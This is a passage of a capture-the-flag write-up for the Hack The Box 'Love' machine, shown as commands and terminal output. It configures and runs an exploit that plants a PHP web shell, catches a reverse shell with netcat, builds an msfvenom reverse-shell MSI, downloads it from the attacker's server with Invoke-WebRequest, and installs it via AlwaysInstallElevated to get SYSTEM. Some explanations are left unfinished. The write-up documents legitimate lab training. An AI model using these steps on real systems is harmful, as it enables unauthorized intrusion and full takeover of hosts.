            print("Error")

def callShell():
    r = s.get(CALL_SHELL, verify=False)
    if r.status_code == 200:
        print("Shell called check your listiner")
print("Start a NC listner on the port you choose above and run...")
sendPayload()
callShell()
{% endhighlight %}

<!-- {% comment %}

{% highlight python linenos %}
# --- Edit your settings here ----
IP = "192.168.1.207" # Website's URL
USERNAME = "potter" #Auth username
PASSWORD = "password" # Auth Password
REV_IP = "192.168.1.207" # Reverse shell IP
REV_PORT = "8888" # Reverse port
# --------------------------------

INDEX_PAGE = f"http://{IP}/votesystem/admin/index.php"
LOGIN_URL = f"http://{IP}/votesystem/admin/login.php"
VOTE_URL = f"http://{IP}/votesystem/admin/voters_add.php"
CALL_SHELL = f"http://{IP}/votesystem/images/shell.php"
{% endhighlight %}
{% endcomment %}-->

At the top of the exploit, there are four settings parameters we need to configure. We configure them as shown below. Note that the `REV_IP` should be set to the IP address of our host over the VPN connection as this is where the target host will connect to provide a reverse shell. Finally, we also need to remove "votesystem" from the `INDEX_PAGE`, `LOGIN_URL`, `VOTE_URL` and `CALL_SHELL` parameters since the admin pages are located in the root of the web application in our case. 
{% highlight python linenos %}
# --- Edit your settings here ----
IP = "love.htb" # Website's URL
USERNAME = "admin" #Auth username
PASSWORD = "@LoveIsInTheAir!!!!" # Auth Password
REV_IP = "10.10.16.4" # Reverse shell IP
REV_PORT = "8888" # Reverse port
# --------------------------------

INDEX_PAGE = f"http://{IP}/admin/index.php"
LOGIN_URL = f"http://{IP}/admin/login.php"
VOTE_URL = f"http://{IP}/admin/voters_add.php"
CALL_SHELL = f"http://{IP}/images/shell.php"
{% endhighlight %}

Next, we execute "nc -lvp 8888" to start a listener on port 8888 and run the exploit.

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@python3 exploit.py@@
Start a NC listner on the port you choose above and run...
@@@Logged in@@@
@@@Poc sent successfully@@@
{% endhighlight %}

{% highlight none linenos %}
┌──(kali㉿kali)-[~]
└─$ @@nc -lvp 8888@@                                                       
listening on [any] 8888 ...
@@@connect to [10.10.16.4] from love.htb [10.10.10.239] 62984@@@
b374k shell : connected

Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\omrs\images>@@whoami@@
whoami
@@@love\phoebe@@@

C:\xampp\htdocs\omrs\images>
{% endhighlight %}

After a couple of seconds we receive a shell on the target as a user named "phoebe", as can be seen above.

# Privilege Escalation

We can query the windows registry for many things. F.e always install elevated. 
TODO BG

{% highlight none linenos %}
C:\xampp\htdocs\omrs\images>@@reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated@@
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    @@@AlwaysInstallElevated@@@    REG_DWORD    @@@0x1@@@


C:\xampp\htdocs\omrs\images>@@reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated@@
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    @@@AlwaysInstallElevated@@@    REG_DWORD    @@@0x1@@@


C:\xampp\htdocs\omrs\images>
{% endhighlight %}

We generate our malicious msi file with msfvenom. The `windows/shell_reverse_tcp` is an unstaged reverse shell payload, meaning that we can catch it with a netcat listener. Lhost and lport specify the ip and port the reverse shell should connect back to. -f specifies that we want the payload in the format of an msi file. We save it to a file named "rs.msi".

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@msfvenom -p windows/shell_reverse_tcp lhost=10.10.16.4 lport=8889 -f msi > rs.msi@@
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
@@@Final size of msi file: 159744 bytes@@@
{% endhighlight %}

The next step is to download this payload to the target and execute it. We start by starting a python web server by executing `python3 -m http.server 80`. Then, in our reverse shell, we start powershell by executing "powershell". We then run the [Invoke-WebRequest]() cmdlet with the -Uri and -OutFile flags to download our malicious MSI file. We use the -Uri flag to specify the URL of the malicious MSI file on our web server and the -OutFile flag to specify where the file should be written. Note that we write the file to the C:\Windows\temp directory since this is normally a location where all windows accounts have `Write` permissions.

{% highlight none linenos %}
C:\xampp\htdocs\omrs\images>@@powershell@@
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

@@@PS@@@ C:\xampp\htdocs\omrs\images> @@Invoke-WebRequest -Uri "http://10.10.16.4/rs.msi" -OutFile "C:\Windows\temp\rs.msi"@@
Invoke-WebRequest -Uri "http://10.10.16.4/rs.msi" -OutFile "C:\Windows\temp\rs.msi"
{% endhighlight %}

Once we execute the command, we can see in the outpuy of the Python web server that the download was successful.
{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@sudo python3 -m http.server 80@@                                             
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
@@@10.10.10.239 - - [18/Apr/2022 11:03:17] "GET /rs.msi HTTP/1.1" 200 -@@@
{% endhighlight %}

Next, we execute "nc -lvp 8889" to start a netcat listener on port 8889. Then, we use msiexec to install our malicious MSI file. Note that we use \quiet to specify that x and \qn to specify that x. The \i flag is simply used to specify that we want to install an MSI file.
{% highlight none linenos %}
PS C:\xampp\htdocs\omrs\images> @@msiexec /quiet /qn /i C:\Windows\Temp\rs.msi@@
msiexec /quiet /qn /i C:\Windows\Temp\rs.msi
PS C:\xampp\htdocs\omrs\images>
{% endhighlight %}

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@nc -lvp 8889@@                                                 
listening on [any] 8889 ...
connect to [10.10.16.4] from love.htb [10.10.10.239] 62999
Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>@@whoami@@
whoami
@@@nt authority\system@@@

C:\WINDOWS\system32>
{% endhighlight %}

As soon as we execute the malicious MSI file, our netcat listener receives a connection and we obtain a shell as the `SYSTEM` account on the target host!


